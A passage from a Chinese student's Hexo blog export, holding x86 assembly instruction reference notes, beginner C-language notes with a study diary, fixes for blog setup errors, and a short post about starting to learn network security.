<h2 id="串操作指令"><a href="#串操作指令" class="headerlink" title="串操作指令"></a>串操作指令</h2><p>串操作指令用于处理存放在存储器中的数据串，有串传送、串比较、串扫描、串装入、串存储。其中，仅有串比较和串扫描指令对标志位OF、SF、ZF、AF、PF、CF有影响。 [4] </p>
<p>DS：SI ——源串<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>：源串<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">变址</a>。</p>
<p>ES：DI ——目标串<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>：目标串<a href="https://baike.baidu.com/item/%E5%8F%98%E5%9D%80">变址</a>。</p>
<p>CX： 重复次数计数器。</p>
<p>AL/AX： 扫描值。</p>
<p>D标志： 0表示重复操作中SI和DI应自动增量；1表示应自动减量。</p>
<p>Z标志： 用来控制扫描或比较操作的结束。</p>
<p>MOVS： 串传送。（MOVSB 传送字符， MOVSW 传送字， MOVSD 传送双字）</p>
<p>CMPS： 串比较。（CMPSB 比较字符， CMPSW 比较字）</p>
<p>SCAS： 串扫描。把AL或AX的内容与目标串作比较，比较结果反映在标志位。</p>
<p>LODS： 装入串。把源串中的元素（字或字节）逐一装入AL或AX中。（<a href="https://baike.baidu.com/item/LODSB">LODSB</a> 传送字符， LODSW 传送字，LODSD 传送双字）</p>
<p>STOS： 保存串。是LODS的逆过程。</p>
<p>REP： 当CX/ECX&lt;&gt;0时重复。</p>
<p>REPE/REPZ： 当ZF=1或比较结果相等，且CX/ECX&lt;&gt;0时重复。</p>
<p>REPNE/REPNZ： 当ZF=0或比较结果不相等，且CX/ECX&lt;&gt;0时重复。</p>
<p>REPC： 当CF=1且CX/ECX&lt;&gt;0时重复。</p>
<p>REPNC： 当CF=0且CX/ECX&lt;&gt;0时重复。 [6] </p>
<h2 id="程序转移指令"><a href="#程序转移指令" class="headerlink" title="程序转移指令"></a>程序转移指令</h2><p>控制转移类指令包括无条件转移指令、条件转移指令、循环控制指令、中断指令、子程序调用和返回指令。 [4] </p>
<h3 id="无条件转移指令"><a href="#无条件转移指令" class="headerlink" title="无条件转移指令"></a>无条件转移指令</h3><p>（长转移）</p>
<p>JMP： 无条件转移指令。</p>
<p>CALL： 过程调用。call会做两件事情，其一，将call指令后面的一条指令的地址压入栈中，无条件跳转到call指令调用函数的地址处，开始执行子程序。</p>
<p>RET/RETF： 过程返回。ret指令，则执行call指令后面的一条指令。</p>
<h3 id="条件转移指令"><a href="#条件转移指令" class="headerlink" title="条件转移指令"></a>条件转移指令</h3><p>（短转移，-128到+127的距离内；当且仅当(SF、XOR、OF)=1时，OP1&lt;OP2 ）</p>
<p>JA/JNBE： 大于转移。</p>
<p>JAE/JNB： 大于或等于转移。</p>
<p>JB/JNAE： 小于转移。</p>
<p>JBE/<a href="https://baike.baidu.com/item/JNA">JNA</a>： 小于或等于转移。</p>
<p>以上四条，测试<a href="https://baike.baidu.com/item/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B4%E6%95%B0">无符号整数</a>运算的结果（标志C和Z）</p>
<p>JG/JNLE： 大于转移。</p>
<p>JGE/JNL： 大于或等于转移。</p>
<p>JL/JNGE： 小于转移。</p>
<p><a href="https://baike.baidu.com/item/JLE">JLE</a>/JNG： 小于或等于转移。</p>
<p>以上四条，测试带符号整数运算的结果（标志S，O和Z）</p>
<p>JE/JZ： 等于转移。</p>
<p>JNE/JNZ： 不等于时转移。</p>
<p>JC： 有进位时转移。</p>
<p>JNC： 无进位时转移。</p>
<p>JNO： 不溢出时转移。</p>
<p>JNP/JPO： 奇偶性为奇数时转移。</p>
<p>JNS： 符号位为 “0” 时转移。</p>
<p>JO： 溢出转移。</p>
<p>JP/JPE： 奇偶性为偶数时转移。</p>
<p>JS： 符号位为 “1” 时转移。 [6] </p>
<h3 id="循环控制指令"><a href="#循环控制指令" class="headerlink" title="循环控制指令"></a>循环控制指令</h3><p>（短转移）</p>
<p>LOOP： CX不为零时循环。</p>
<p>LOOPE/LOOPZ： CX不为零且标志Z=1时循环。</p>
<p>LOOPNE/LOOPNZ： CX不为零且标志Z=0时循环。</p>
<p>JCXZ： CX为零时转移。</p>
<p>JECXZ： ECX为零时转移。</p>
<h3 id="中断指令"><a href="#中断指令" class="headerlink" title="中断指令"></a>中断指令</h3><p>INT： <a href="https://baike.baidu.com/item/%E4%B8%AD%E6%96%AD%E6%8C%87%E4%BB%A4">中断指令</a>。</p>
<p>INTO： 溢出中断。</p>
<p>IRET： 中断返回。</p>
<h2 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h2><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><p>DB： 定义字节（1字节）</p>
<p>DW： 定义字（2字节）</p>
<p>DD： 定义双字（4字节）</p>
<p>PROC： 定义过程。</p>
<p>ENDP： 过程结束。</p>
<p>SEGMENT： 定义段。</p>
<p>ASSUME： 建立段<a href="https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80">寄存器寻址</a>。</p>
<p>ENDS： 段结束。</p>
<p>END： 程序结束。</p>
<h3 id="处理机控制指令"><a href="#处理机控制指令" class="headerlink" title="处理机控制指令"></a>处理机控制指令</h3><p>即标志处理指令，处理机控制指令完成简单的控制功能。</p>
<p>CLC： （进位位置0指令）</p>
<p>CMC： （进位位求反指令）</p>
<p>CLC： （进位位置为0指令）</p>
<p>STC： （进位位置为1指令）</p>
<p>CLD： （方向标志位置0指令）</p>
<p>STD： （方向标志位置1指令）</p>
<p>CLI： （中断标志置0指令）</p>
<p>STI： （中断标志置1指令）</p>
<p>NOP： （无操作）</p>
<p>HLT： （停机）</p>
<p>WAIT： （等待）</p>
<p>ESC： （换码）</p>
<p>LOCK： （封锁）</p>
]]></content>
  </entry>
  <entry>
    <title>初试c语言——笔记</title>
    <url>/2020/10/02/2020-10-02-%E5%88%9D%E8%AF%95c%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="一、c语言小记"><a href="#一、c语言小记" class="headerlink" title="一、c语言小记"></a>一、c语言小记</h1><h5 id="秘诀：多看，多试，多错，多想"><a href="#秘诀：多看，多试，多错，多想" class="headerlink" title="秘诀：多看，多试，多错，多想"></a>秘诀：多看，多试，多错，多想</h5><p>1、作为警示，c语言中需注意，所输入的符号必须是在<em><strong>半角模式下</strong></em>的，否侧将导致运行错误</p>
<p>2、在”{}”里面输入的语句大多要以”;”进行分隔，而在”()”里的语句大多使用”,”分隔</p>
<p>3、添加一些关键字的说明（接下来的学习中都会碰见的）：</p>
<p><strong>auto//声明自动变量（一般可省略）</strong></p>
<p> <strong>break//跳出当前循环</strong></p>
<p><strong>case//开关语句分支</strong></p>
<p><strong>char//声明字符型变量或者函数返回值类型</strong></p>
<p><strong>const//定义常量，如果一个变量被const修饰，那么他的值就不能被改变</strong></p>
<p><strong>continue//结束当前循环，开始下一轮循环</strong></p>
<p><strong>default//开关语句中的“其他”分支</strong></p>
<p><strong>do//循环语句的循环体</strong></p>
<p><strong>double//声明双精度浮点型变量或函数返回值类型</strong></p>
<p>**else//条件语句否定分支与if连用 **</p>
<p><strong>enum//声明枚举类型</strong></p>
<p><strong>extern//声明变量或者函数是在其他文件或者本文件的其他位置定义—–</strong></p>
<p><strong>float//声明浮点型变量或者函数返回值类型</strong></p>
<p><strong>for//一种循环语句</strong></p>
<p><strong>goto//无条件跳转语句</strong></p>
<p><strong>if//条件语句</strong></p>
<p><strong>int//声明整数变量或函数</strong></p>
<p><strong>long//声明长整型变量或者函数返回值类型</strong></p>
<p><strong>register//声明寄存器变量———</strong></p>
<p><strong>return//子程序返回语句（可以带参数，也可不带参数）</strong></p>
<p><strong>short//声明短整数型变量或者函数</strong></p>
<p><strong>signed//声明有符号类型变量或函数</strong></p>
<p><strong>sizeof//计算数据类型或者变量长度（即所占字节数）</strong></p>
<p><strong>static//声明静态变量———</strong></p>
<p><strong>struct//[声明结构体变量]———</strong></p>
<p><strong>switch//用于开关语句</strong></p>
<p><strong>typedef//用于给数据类型取别名</strong></p>
<p><strong>unsigned//声明无符号类型变量或函数</strong></p>
<p><strong>union//声明共用体类型———-</strong></p>
<p> <strong>void//声明函数无返回值或无参数，声明无类型指针——-</strong></p>
<p><strong>volatile//说明函数无返回值或无参数，声明无类型指针——-</strong></p>
<p><strong>while//循环语句的循环条件</strong></p>
<p>4、每输入一个变量时，都需在前对其进行声明，这步才会使变量有意义，否侧将导致错误</p>
<p>5、进行类型转换的时候，需要注意字节问题，一旦字节不够，将得到错误结果</p>
<p>6、注意点：无论对哪个变量，还是字符，都得附上对其明确的定义，初学时常忘记</p>
<p>7、对某一变量声明他的数据类型时一定要一致，例如，定义变量a为整型数（int a），结果计算式中a=3.2+6.4=9.6，但此时a将只会输出9这个整数</p>
<p>8、extern可以放在变量或者函数前面引用不在同一个文件里面的变量</p>
<p>9、全局变量的定义声明放在预命令的下一行较为合适，可以使得全部函数都能调用该全局变量（具体还是看习惯）</p>
<p>10、运算“/”时，如果两边都为整数，则结果为舍去小数的整数部分，如15/4为3，要得到正确答案，要像15.0/4这样，有一个数为浮点数</p>
<p>11、求余符号“%”要求在符号左右两边都必须是<strong>整数</strong></p>
<p>12、赋值运算符左边只能是单个变量</p>
<p>13、运算符优先级别高低：**!&gt;算术运算符&gt;关系运算符&gt;&amp;&amp;&gt;||&gt;赋值运算符&gt;逗号运算符**</p>
<p>14、逻辑运算符一旦确认了逻辑表达式的值就将停止，如（a=0）&amp;&amp;（b=5），检验到a为0，就会停下，不会去运行b=5（补充：因为在c语言中判断真假依据是：非0为真，0为假）</p>
<p>15、~按位取反不能理解为是取了一个负号，可以想想有负号“-”就知道不应该有两个相同作用的符号</p>
<p>16、要运用不同的头文件里的函数的方法就是在预命令中输入你要用的函数所在的头文件</p>
<p>17、用if-else的嵌套格式应为</p>
<p><strong>if（表达式1）+语句1；</strong></p>
<p><strong>else if （表达式2）+语句2······</strong></p>
<p>18、switch 结构：switch（<strong>整型</strong>表达式）｛</p>
<p>case <strong>整型</strong>常量: 语句; break；······</p>
<p>default :语句｝</p>
<p>注：default可以不出现，其作用是指向除case列举的数值之外的数值执行其后面的语句</p>
<p>19、while(条件){循环体} 类型的循环语句，在括号内填入循环运行的条件，花括号里面填写要重复计算的式子</p>
<p>20、do-while类型是 将会<strong>先执行一次循环体</strong>，再判断是否满足条件执行下一次，而while，for是<strong>先判断再执行</strong></p>
<p>21、for(表达式1；表达式2；表达式3)类型里面的三个表达式都能个别省略，  同时循环体可以放进第三个表达式中，但是<em><strong>“；”不能省略，括号里面一定要有两个“；”</strong></em>并且需要注意的是，如果省略了表达式，那么循环停止的条件一定要在循环体内列出，否则将是无限循环。</p>
<p>22、当用for类型进行循环嵌套时，第一个for中执行的变量进入第二个for时，第二个for中变量值都会从最开始设置的值开始进行循环</p>
<p>23、当某结构后面需要执行的语句不止一条时用花括号将所有语句包含</p>
<p>24、当语句中嵌套多种语句时，一定要注意写清楚，分隔好，不然或许连自己查看都会出现障碍</p>
<p>25、break只能在<strong>循环语句和switch语句</strong>中使用，在循环语句中用来跳出当前循环（需要与if连用），在switch只能结束单句语句</p>
<p>26、continue只能用于<strong>循环语句</strong>，与if连用，如果if语句条件满足为真，程序将不会运行至continue之后的语句，而是进入下一次的循环。</p>
<p>27、scanf中的非法输入要注意，虽然看似可能是一种错误，但有效的将之运用，也能让其为我们创造更多的输入</p>
<p>28、可用一些标识符（不能是关键词）加“: ”放在语句前，进行注释，注释后可以用<strong>goto 标识符</strong> 执行在其冒号之后的语句（不建议使用，破坏模块化的结构顺序）</p>
<p>29、对于相同的一个循环问题，可以多想想是否能用不同的循环语句去完成，可以获得更多的思考</p>
<p>30、对于循环嵌套循环的结构，注意重要一点，也是容易搞错的地方：只有内层的循环结束时，才会再继续执行外层的大循环</p>
<p>31、当使用while（1）无限循环的语句时，若是在内部有使用多个输入函数进行取值，并且有些取的类型为字符时需要在其后面添加一个getchar（）来盛放你之前输入的回车键这个字符</p>
<p>32、对于函数定义变量的精度一定要与其使用scanf函数里面的精度一致，否则将出错</p>
<p>33、什么时候用循环语句？当有多个东西类型相似需要重复做多次的，可以想想循环语句能不能用上，将可以简化代码</p>
<p>34、什么时候用嵌套循环（一般为双重循环语句）？当涉及两个需要改变的东西的时候，比如两个方位，两个变量等等</p>
<p>35、if(   )  后面跟的语句可以为空语句，即什么都不输入，表示空语句</p>
<p>36、c语言中｛｝后面有符号的情况：</p>
<p>（1）结构体、共用体、枚举类型的花括号后面要加分号</p>
<p>（2）在二维数组的初始化里面分行进行初始化的花括号后面要加逗号</p>
<p>37、c语言如果是输出结果要求四舍五入，那么可以在printf函数中的如d、f前加上 .a(a为保留的小数位数)；如果是在途中的变量四舍五入，则需要强制类型转换加0.5的做法</p>
<p>38、对于/，再次进行详细说明，对于值是整数的变量，没办法像数字那样直接加个小数点，此时可以换一种思路，就是乘或除以1.0（注意运算顺序！）就可以得到浮点型的结果</p>
<h2 id="二、学习感想"><a href="#二、学习感想" class="headerlink" title="二、学习感想"></a>二、学习感想</h2><p>Date：2020.10.03 </p>
<p>作为一个确确实实的零基础小白，我先从c语言教材基础这本书开始认真看，那句hello world的程序，加上后面的几个程序，一点一点的理解这些对我来说都是全新的东西，从开头预命令，到函数头，函数名，最后语句，才算是对c有了那么些许理解，而这些竟然就花去了我合计一天左右的时间，感叹自己天资愚钝（落泪）。</p>
<p>Date：2020.10.08</p>
<p>感觉这几天有些懈怠，是因为学完了基础教程的第一章，完成了一个小目标而懈怠的吗？我觉得这样不行，今天该重回状态，所以特意早起赶去学习。发现，确实我还有很多很多很多很多（省略n字）不懂，不过这才更有意思，掌握知识的感觉在我看来是十分愉悦的。</p>
<p>Date：202010.09</p>
<p>第一个双休前的晚上，我选择在实训室度过，之后的两天也是，哈哈哈，好吧，确实学的东西好多，感觉自己学不会，没什么天赋。来这发发牢骚。加油！然后就是&amp;（取地址），\n这两个符号容易忘记，导致程序运行有误</p>
<p>Date：2020.10.11</p>
<p>这次学习，只用了一个半小时就把第二章学完了，比起之前快多了（内容较为简单，多是需要记诵的内容），不过应该没掌握很好，后面跟练习熟悉吧，我想在两三周时间之内把c自行结束了，因为有太多的东西等着我去一一摸索，虽然想起来很累，但我竟然觉得兴奋？可能这就是热爱吧？第一次对某个算是学习的事物这么上心，我期待我之后的表现</p>
<p>Date：2020.10.15</p>
<p>今天总算结束了第三章学习，说实话，这章的循环语句与选择语句其实还好，就是需要记住一些格式上的东西，理解还是不难，难点应该在于多种语句的层层嵌套，属实为难人，头发都掉了不少（苦笑），继续努力吧，</p>
<p>Date：2020.11.9</p>
<p>今天才算是勉强完成了整本c语言的学习吧，不过资质愚钝的我，也就是懂了一些语法，知道一些东西，其他的方面，仍然是个小白。害，挺累的其实，不过很充实，和以前浑浑噩噩的生活不同，我觉得，大学，我该出发的，也想成为与众不同的人！</p>
]]></content>
      <tags>
        <tag>学习c时的一些笔记与心得</tag>
      </tags>
  </entry>
  <entry>
    <title>搭博客遇到的一些错误——排坑</title>
    <url>/2020/10/01/2020-10-01-%E5%8D%9A%E5%AE%A2%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF%E2%80%94%E2%80%94%E6%8E%92%E5%9D%91/</url>
    <content><![CDATA[<p>1、新手小白值得注意一点：一些代码的输入要用英文的输入方式，不能使用中文，不然符号将出现错误，导致运行出错，错误将不易察觉（写出来，当然是我自己犯过这样的错）</p>
<p> 2、出现 <img src="2020-10-01-git%E9%94%99%E8%AF%AF.assets/QQ%E5%9B%BE%E7%89%8720201002223534-1606569873256.png"></p>
<p>解决方法：输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs git">*git config --global core.autocrlf false*<br></code></pre></td></tr></table></figure>

<p>3、出现FATAL YAMLException: can not read a block mapping entry;的错误，<br>解决方法：检查_config.yml<br>一般来说问题出现在你添加的东西没有在前面加空格，添加就好</p>
<p>4、出现YAMLException: end of the stream or a document separator is expected at line x, column y<br>错误原因同上，后跟数字是错误的具体位置</p>
<p>5、当出现*.github.io无法进行访问时</p>
<p>解决方法：使用win+R在运行中输入drivers后，再进入etc，最后修改hosts，</p>
<p>在最末尾添加网址ip (可以点击 <a href="http://tool.chinaz.com/dns/">工具之家</a>进行查询)</p>
<p>格式为：000.000.000.000. github用户名.github.io <em><strong>hosts第一次修改要先复制出来，粘贴在桌面之类的地方进行修改，再覆盖原来的</strong></em>）</p>
<p>最后<strong>hexo g</strong> 和<strong>hexo d</strong>部署一下就好了</p>
<p>6、当出现你输入<strong>hexo s/g/d</strong>等一系列hexo指令时，运行的结果都与输入<strong>hexo</strong>一致的时候，错误原因可能是在创建时输错了一些东西没发觉，导致生成的文档不符合而出错，目前我只知道可以通过删除所有文件，重头开始（后续若知道其他方法，将会更新）</p>
<p>7、出现<img src="2020-10-01-git%E9%94%99%E8%AF%AF.assets/QQ%E5%9B%BE%E7%89%8720201002223525-1606569900275.png">输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs git">npm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>关于一些我在搭建博客时遇到的错误（来源当时都没注意，许多是从大佬那获取的）</tag>
      </tags>
  </entry>
  <entry>
    <title>新生</title>
    <url>/2020/09/30/2020-09-30-%E6%96%B0%E7%94%9F/</url>
    <content><![CDATA[<p>  很高兴，总共历时十五小时左右的时间，总算创造了属于我的简陋的博客，感动泪目·doge·<br>将之命名为新生，是因为在此前从未接触过，进入一个全新的领域，进行学习，此刻的我就<br>像一个初生的婴儿般，在网安这个舞台上重生。之后便是学习，学习，学习！强大自己，以此纪念吧</p>
]]></content>
  </entry>
</search>
